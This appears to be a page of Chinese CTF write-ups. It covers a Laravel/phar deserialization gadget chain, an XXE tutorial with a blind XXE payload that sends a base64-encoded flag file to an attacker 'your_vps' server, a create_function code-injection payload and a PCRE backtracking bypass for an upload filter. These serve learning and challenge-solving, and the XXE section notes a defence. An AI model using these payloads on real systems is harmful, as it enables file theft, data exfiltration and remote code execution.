<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Illuminate\Broadcasting&#123;</span><br><span class="line">    class PendingBroadcast&#123;</span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            $this-&gt;events = new \Faker\ValidGenerator();</span><br><span class="line">            $this-&gt;event = &apos;everything&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace PHPUnit\Framework\MockObject\Invocation&#123;</span><br><span class="line">    class StaticInvocation&#123;</span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            $this-&gt;parameters = array(&apos;/var/www/html/upload/hpdoger.php&apos;,&apos;&lt;?php print_r(file_get_contents(&apos;../../flag_larave1_b0ne&apos;));?&gt;&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace PHPUnit\Framework\MockObject\Stub&#123;</span><br><span class="line">    class ReturnCallback&#123;</span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            $this-&gt;callback = &apos;file_put_contents&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Faker&#123;</span><br><span class="line">    class ValidGenerator&#123;</span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            $evilobj = new \PHPUnit\Framework\MockObject\Invocation\StaticInvocation();</span><br><span class="line">            $g1 = new \Faker\Generator(array(&apos;everything&apos; =&gt; $evilobj ));</span><br><span class="line">            $g2 = new \Faker\Generator(array(&quot;dispatch&quot; =&gt; array($g1, &quot;getFormatter&quot;)));</span><br><span class="line"></span><br><span class="line">            $rc = new \PHPUnit\Framework\MockObject\Stub\ReturnCallback();</span><br><span class="line"></span><br><span class="line">            $this-&gt;validator = array($rc, &quot;invoke&quot;);</span><br><span class="line">            $this-&gt;generator = $g2;</span><br><span class="line">            $this-&gt;maxRetries = 10000;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class Generator&#123;</span><br><span class="line">        function __construct($form)&#123;</span><br><span class="line">            $this-&gt;formatters = $form;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">namespace&#123;</span><br><span class="line">    $exp = new Illuminate\Broadcasting\PendingBroadcast();</span><br><span class="line">    print_r(urlencode(serialize($exp)));</span><br><span class="line"></span><br><span class="line">    // phar</span><br><span class="line">    $p = new Phar(&apos;./hpdoger.phar&apos;, 0);</span><br><span class="line">    $p-&gt;startBuffering();</span><br><span class="line">    $p-&gt;setStub(&apos;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&apos;);</span><br><span class="line">    $p-&gt;setMetadata($exp);</span><br><span class="line">    $p-&gt;addFromString(&apos;1.txt&apos;,&apos;text&apos;);</span><br><span class="line">    $p-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上传文件，接着进行反序列化</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://51.158.73.123:8080/server/editor?action=Catchimage&amp;source[]=phar:///var/www/html/upload/image/9af04fac3af8c9d11572234ca3c4c98b/201901/09/26b5b639d9f75a9426cf.gif</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/01/09/5c35f967d6ab3.png" alt></p>
<p>再次膜前辈师傅们</p>

                
            </div>
            <div class="continue">
            <a href="/2019/01/09/Code-breaking-medium֮lumenserial/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/01/07/从两道CTF题目学习XXE漏洞/"> 
                    从两道CTF题目学习XXE漏洞 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-01-07   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/XXE/">XXE</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="从两道CTF题目学习XXE漏洞"><a href="#从两道CTF题目学习XXE漏洞" class="headerlink" title="从两道CTF题目学习XXE漏洞"></a>从两道CTF题目学习XXE漏洞</h1><p>接触安全到现在，一直没有碰xxe相关的知识。一是觉得xml类型的东西太概念化了，二是觉得实用性不大，因为现在很少见到用xml形式来传输数据。不巧的是最近35CTF就有一道blind xxe题目，干脆把之前的坑填了，从零来学习一下XXE漏洞</p>
<h1 id="XML相关知识"><a href="#XML相关知识" class="headerlink" title="XML相关知识"></a>XML相关知识</h1><h2 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h2><p>XML被设计为传输和存储数据，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。</p>
<p><strong>通俗点来说就是存储数据的一种格式</strong><br><img src="https://i.loli.net/2019/01/06/5c319a94ce60c.jpg" alt><br>它的形式类似于html，都是标签闭合，且有根元素和子元素说法，例如note就是根元素，from和to都是子元素</p>
<h2 id="什么是实体"><a href="#什么是实体" class="headerlink" title="什么是实体"></a>什么是实体</h2><p>实体有以下四种：</p>
<ul>
<li>内置实体 (Built-in entities)</li>
<li>字符实体 (Character entities)</li>
<li>通用实体 (General entities)</li>
<li>参数实体 (Parameter entities)</li>
</ul>
<p><strong>实体根据引用方式，还可分为内部实体与外部实体。</strong>这里简要说一下内部实体和引发XXE漏洞的外部实体、参数实体</p>
<h3 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h3><p>即在xml文档中自定义一个实体<br>格式：<code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code>，这是一种引入形式，好比C中引入变量都要声明变量，只不过在XML里引入的不叫变量，而叫做<strong>实体</strong></p>
<p><img src="https://i.loli.net/2019/01/06/5c31a36c41df0.png" alt></p>
<h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><p>格式：<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</code>，在xml里不给实体赋予具体的值，而是通过某URI引入，叫做外部实体引入</p>
<p>下面是支持使用的URI<br><img src="https://thief.one/upload_image/20170620/1.png" alt></p>
<p>关于外部实体引用file协议的例子如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;&amp;file;&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<h3 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;</span><br><span class="line">或者</span><br><span class="line">&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>外部引入参数实体的例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">    %name;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>注意:%name（参数实体）是<strong>在DTD中被引用</strong>的，而其余实体是在xml文档中被引用的。</p>
<h2 id="什么是DTD"><a href="#什么是DTD" class="headerlink" title="什么是DTD"></a>什么是DTD</h2><p>W3C定义：DTD即文档类型定义（document type define）,可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。<br>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p>
<p>我理解的DTD是构建一个区域，声明在区域中要引入的实体\元素</p>
<h3 id="内部声明DTD"><a href="#内部声明DTD" class="headerlink" title="内部声明DTD"></a>内部声明DTD</h3><p>语法：<code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p>
<p><img src="https://i.loli.net/2019/01/06/5c319fbbd03ee.png" alt></p>
<p>即在xml文档内部用DTD声明：我的根元素是root，在根元素下有to、from这些元素。</p>
<p>其实，你声明的元素和下面的元素名称不对应时也会进行解析。所以我觉得用DTD的用处就是给使用者一个目录栏，为了告诉他们下面的元素结构是什么样子的，而目录栏标题的名字是否正确不做强制要求。</p>
<p><strong>PS：#PCDATA的意思是解析字符数据</strong></p>
<h3 id="外部声明DTD"><a href="#外部声明DTD" class="headerlink" title="外部声明DTD"></a>外部声明DTD</h3><p>语法：<code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code>,即引入外部的dtd声明,其中dtd文件就是引入的实体</p>
<p><img src="https://i.loli.net/2019/01/06/5c31a1a35b693.png" alt></p>
<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。</p>
<p>上文的外部实体引入部分，可以调用URI来加载数据，这也是造成漏洞点的地方。</p>
<h2 id="有回显的XXE"><a href="#有回显的XXE" class="headerlink" title="有回显的XXE"></a>有回显的XXE</h2><p>jarvisoj平台上的题目</p>
<p>题目描述：请设法获得目标机器/home/ctf/flag.txt中的flag值</p>
<p><img src="https://i.loli.net/2019/01/06/5c31b29f0180e.png" alt></p>
<h2 id="35CTF-Blind-XXE"><a href="#35CTF-Blind-XXE" class="headerlink" title="35CTF Blind XXE"></a>35CTF Blind XXE</h2><p>这个是XXE漏洞能够利用的普遍场景，一般能利用XXE的地方有回显的机率几乎为0。利用blind xxe把数据外带到自己的服务器</p>
<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  function __autoload($cls) &#123;</span><br><span class="line">    include $cls;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  class Black &#123;</span><br><span class="line">    public function __construct($string, $default, $keyword, $store) &#123;</span><br><span class="line">      if ($string) ini_set(&quot;highlight.string&quot;, &quot;#0d0d0d&quot;);</span><br><span class="line">      if ($default) ini_set(&quot;highlight.default&quot;, &quot;#0d0d0d&quot;);</span><br><span class="line">      if ($keyword) ini_set(&quot;highlight.keyword&quot;, &quot;#0d0d0d&quot;);</span><br><span class="line"></span><br><span class="line">      if ($store) &#123;</span><br><span class="line">            setcookie(&apos;theme&apos;, &quot;Black-&quot;.$string.&quot;-&quot;.$default.&quot;-&quot;.$keyword, 0, &apos;/&apos;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  class Green &#123;</span><br><span class="line">    public function __construct($string, $default, $keyword, $store) &#123;</span><br><span class="line">      if ($string) ini_set(&quot;highlight.string&quot;, &quot;#00fb00&quot;);</span><br><span class="line">      if ($default) ini_set(&quot;highlight.default&quot;, &quot;#00fb00&quot;);</span><br><span class="line">      if ($keyword) ini_set(&quot;highlight.keyword&quot;, &quot;#00fb00&quot;);</span><br><span class="line"></span><br><span class="line">      if ($store) &#123;</span><br><span class="line">            setcookie(&apos;theme&apos;, &quot;Green-&quot;.$string.&quot;-&quot;.$default.&quot;-&quot;.$keyword, 0, &apos;/&apos;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if ($_=@$_GET[&apos;theme&apos;]) &#123;</span><br><span class="line">    if (in_array($_, [&quot;Black&quot;, &quot;Green&quot;])) &#123;</span><br><span class="line">      if (@class_exists($_)) &#123;</span><br><span class="line">        ($string = @$_GET[&apos;string&apos;]) || $string = false;</span><br><span class="line">        ($default = @$_GET[&apos;default&apos;]) || $default = false;</span><br><span class="line">        ($keyword = @$_GET[&apos;keyword&apos;]) || $keyword = false;</span><br><span class="line"></span><br><span class="line">        new $_($string, $default, $keyword, @$_GET[&apos;store&apos;]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; else if ($_=@$_COOKIE[&apos;theme&apos;]) &#123;</span><br><span class="line">    $args = explode(&apos;-&apos;, $_);</span><br><span class="line">    if (class_exists($args[0])) &#123;</span><br><span class="line">      new $args[0]($args[1], $args[2], $args[3], &apos;&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; else if ($_=@$_GET[&apos;info&apos;]) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>

<p>关于代码逻辑部分简单说一下：</p>
<p>theme、string、default、keyword参数决定cookie，如果cookie存在则对cookie的四个参数以“-”号分割处理：把第一部分当作类名、其余三部分当作初始参数进行实例化。</p>
<p>__autoload()方法没什么用，因为php7.2+以后此方法被废弃了，而环境刚好是7.21，所以是出题人用来混淆的。</p>
<p>既然代码没什么可用的类，就看看能不能实例化可以用的php原生类，这里复盘，SimpleXMlElement可用</p>
<p>关于这个类的具体使用介绍：<a href="http://php.net/manual/zh/class.simplexmlelement.php" target="_blank" rel="noopener">http://php.net/manual/zh/class.simplexmlelement.php</a></p>
<p>这里仅仅大致用法：<br><img src="https://upload-images.jianshu.io/upload_images/9113969-80306fef674a47a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p><img src="https://upload-images.jianshu.io/upload_images/9113969-8f4614644b563b5f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>所以思路就是Blind XXE，让服务器远程解析我们服务器上的xml，获取的数据再次发送到我们的服务器上。</p>
<p>一开始构造xml的poc花了半天时间，主要踩了两个坑：</p>
<p>1、在内部DTD声明中，参数实体不能嵌套参数实体使用，即下方的用法是不允许的，：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % file &quot;hpdoger&quot;&gt;</span><br><span class="line">&lt;!ENTITY % send SYSTEM &apos;http://vps/?file=%file;&apos;&gt;</span><br><span class="line"></span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>只能引入外部声明DTD才能进行<strong>参数实体嵌套使用</strong>，但是嵌套使用还必须满足下面的一个条件</p>
<p>2、 这点是key师傅点播到的：在引入外部DTD声明之后，想要嵌套其它参数实体就必须要用一个“中间参数实体”去搭桥，这个中间参数实体可以理解为eval。具体实现方法看下面的POC</p>
<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>vps上的xml文件如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % send SYSTEM &apos;http://your_vps/test2.dtd&apos;&gt;</span><br><span class="line"></span><br><span class="line">%send;</span><br><span class="line">%test;</span><br><span class="line">%back;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>vps上的外部DTD声明文件test2.dtd如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % test &quot;&lt;!ENTITY &amp;#37; back SYSTEM &apos;http://your_vps/?file=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>用Curl发送请求，–cookie指定请求cookie参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v --cookie &quot;theme=SimpleXMlElement-http://your_vps/xxe.xml-2-true&quot; &quot;http://35.207.132.47:82&quot;</span><br></pre></td></tr></table></figure>

<p>查看web日志即能看到base64加密的flag<br><img src="https://i.loli.net/2019/01/06/5c31fa6b43153.png" alt></p>
<p>其中：</p>
<ul>
<li>外部实体send引入外部DTD声明</li>
<li>参数实体test即为“中间参数实体”</li>
<li>&#37;为了避免编码问题</li>
<li>base64-encode是防止文件内容有空格导致http传输时被截断</li>
</ul>
<h1 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h1><h2 id="关于FUZZ"><a href="#关于FUZZ" class="headerlink" title="关于FUZZ"></a>关于FUZZ</h2><p>关于服务端接收请求，如果已经有lnmp的环境最好。没有的话，这里推荐两个项目：</p>
<ol>
<li><p>TheTwitchy:<a href="https://github.com/TheTwitchy/xxer" target="_blank" rel="noopener">https://github.com/TheTwitchy/xxer</a></p>
</li>
<li><p>docker快速搭建lnmp+ssh(自己的项目求start:):</p>
</li>
</ol>
<p><a href="https://github.com/Hpd0ger/docker-lnmp" target="_blank" rel="noopener">https://github.com/Hpd0ger/docker-lnmp</a></p>
<h2 id="关于XXE漏洞挖掘"><a href="#关于XXE漏洞挖掘" class="headerlink" title="关于XXE漏洞挖掘"></a>关于XXE漏洞挖掘</h2><p>XML作为介质传输流程应该是这样的：</p>
<p>用户传输敏感数据-&gt;xml形式传输-&gt;后端解析xml(loadXML)-&gt;将各DOM节点转化为SimpleXML节点(最终为数组形式，节点名为键名，节点值为键值)-&gt;提取对应节点键值-&gt;数据提取/用户判断</p>
<p>漏洞点就在后端解析xml。</p>
<p>当后端使用<strong>loadXML()</strong>的方法解析xml文档时，会解析恶意xml语句即外部实体的引用，从而造成漏洞。</p>
<p>在挖掘漏洞的时候尤其注意两点：</p>
<ol>
<li>content-type: application/xml</li>
<li>xml形式的数据传输e.g:<code>&lt;user&gt;admin&lt;/user&gt;</code></li>
</ol>
<h2 id="关于防御"><a href="#关于防御" class="headerlink" title="关于防御"></a>关于防御</h2><ol>
<li><p>对于PHP，禁止引用外部实体</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure>
</li>
<li><p>对于其它语言，其实做好过滤就行了。但是很少见到用xml形式的数据传输了..说多了也没啥用</p>
</li>
</ol>

                
            </div>
            <div class="continue">
            <a href="/2019/01/07/从两道CTF题目学习XXE漏洞/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/12/21/Code-Breaking-Puzzles WriteUp/"> 
                    Code-Breaking-Puzzles WriteUp 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-12-21   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="Code-Breaking-Puzzles-WriteUp"><a href="#Code-Breaking-Puzzles-WriteUp" class="headerlink" title="Code-Breaking-Puzzles WriteUp"></a>Code-Breaking-Puzzles WriteUp</h1><p>最近终于可以忙里偷闲来做一下P神的题目，真的能学到不少东西，对底层的一些漏洞知识学习很有帮助。感谢网上已经有好多版本的wp可以提供参考，有一些知识实在是盲区。写一些笔记，不笱求与师傅们观点相异，如果能让看文章的人更能理解这些洞点，也算是我的荣幸了。</p>
<h1 id="easy-function"><a href="#easy-function" class="headerlink" title="easy - function"></a>easy - function</h1><p>不得不说P神的代码简洁又暴力</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$action = $_GET[&apos;action&apos;] ?? &apos;&apos;;</span><br><span class="line">$arg = $_GET[&apos;arg&apos;] ?? &apos;&apos;;</span><br><span class="line"></span><br><span class="line">if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action)) &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $action(&apos;&apos;, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里??是php7+的用法，<strong>$_GET[‘action’]非空则 $action = $_GET[‘action’]</strong></p>
<p>应该是利用action做函数名来执行命令，但$action的首尾做了正则限制，不能直接是函数名。</p>
<p>P神小密圈说到的方式用\可以绕过。原因就是<strong>\funciton</strong>是php原生函数的写法，就是以命名空间+函数名的方法来表示函数。而原生函数的命名空间是”&quot;。这种用法倒是在tp框架里见过，当调用一个类的时候会指明命名空间”\think\db”。虽然很无感命名空间的说法，但是感觉和java里的package类似</p>
<p>接着就是调用Create_function函数来代码注入了，具体原理参考：<a href="http://blog.51cto.com/lovexm/1743442" target="_blank" rel="noopener">http://blog.51cto.com/lovexm/1743442</a></p>
<p>直接上Poc:<br><code>action=create_function&amp;arg=;}print_r(file_get_contents(&#39;../flag_h0w2execute_arb1trary_c0de&#39;));//</code></p>
<p>别忘了注释//，否则逃脱不了函数</p>
<h1 id="easy-pcrewaf"><a href="#easy-pcrewaf" class="headerlink" title="easy - pcrewaf"></a>easy - pcrewaf</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function is_php($data)&#123;</span><br><span class="line">    return preg_match(&apos;/&lt;\?.*[(`;?&gt;].*/is&apos;, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(empty($_FILES)) &#123;</span><br><span class="line">    die(show_source(__FILE__));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user_dir = &apos;data/&apos; . md5($_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">$data = file_get_contents($_FILES[&apos;file&apos;][&apos;tmp_name&apos;]);</span><br><span class="line">if (is_php($data)) &#123;</span><br><span class="line">    echo &quot;bad request&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    @mkdir($user_dir, 0755);</span><br><span class="line">    $path = $user_dir . &apos;/&apos; . random_int(0, 10) . &apos;.php&apos;;</span><br><span class="line">    move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $path);</span><br><span class="line"></span><br><span class="line">    header(&quot;Location: $path&quot;, true, 303);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h2><p>又是一段粗暴的代码。逻辑很清晰：上传文件-&gt;检测是否包含php语句-&gt;否-&gt;跳转到上传的文件</p>
<p>很明显应该是preg_match的洞点，但是当时并不知道具体突破的思路，看了一些文章才知道，原来php用的是PCRE库的。那么什么是PCRE和NFA正则引擎？</p>
<h2 id="PCRE"><a href="#PCRE" class="headerlink" title="PCRE"></a>PCRE</h2><p>PCRE(Perl Compatible Regular Expressions中文含义：perl语言兼容正则表达式)是一个用C语言编写的正则表达式函数库</p>
<p>NFA引擎</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态**</span><br></pre></td></tr></table></figure>

<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>NFA其实就像是用栈的结构来存储匹配成功的字符串，如果匹配不到下一个，则出栈进行上一个字符串匹配。就拿这段正则语句来说</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&apos;/&lt;\?.*[(`;?&gt;].*/is&apos;, $data)</span><br></pre></td></tr></table></figure>

<p>如果我们输入<code>&lt;?php print;abcd</code></p>
<p>那么它匹配的流程应该是这样的：<br><code>&lt;?php print;abc</code><br><code>&lt;?php print;ab</code><br><code>&lt;?php print;a</code><br><code>&lt;?php print;</code><br><code>&lt;?php print;abcd</code></p>
<p><strong>.*</strong>会把?后的所有字符都先匹配到，发现没有[]里面的这些字符后再进行回溯。但是PHP为了防止回溯次数过多，发生拒绝服务，会有一个回溯限制</p>
<p>引用kk师傅的一张图：<br><img src="https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-%E9%A2%98%E8%A7%A3-%E5%AD%A6%E4%B9%A0%E7%AF%87/3.png" alt></p>
<p>5.2以后的版本回溯次数是1000000，超过这个次数还没有匹配到，则会返回false</p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>既然是弱类型比较，我们就用false来等价null绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$f = fopen(&quot;poc.txt&quot;, &quot;w&quot;);</span><br><span class="line">$msg = &quot;&lt;?php print_r(scandir(&apos;../&apos;));?&gt;&quot;.str_repeat(&quot;A&quot;,1000000);</span><br><span class="line">fwrite($f,$msg);</span><br><span class="line">fclose($f);</span><br></pre></td></tr></table></figure>

<p>构造个上传表单完事</p>
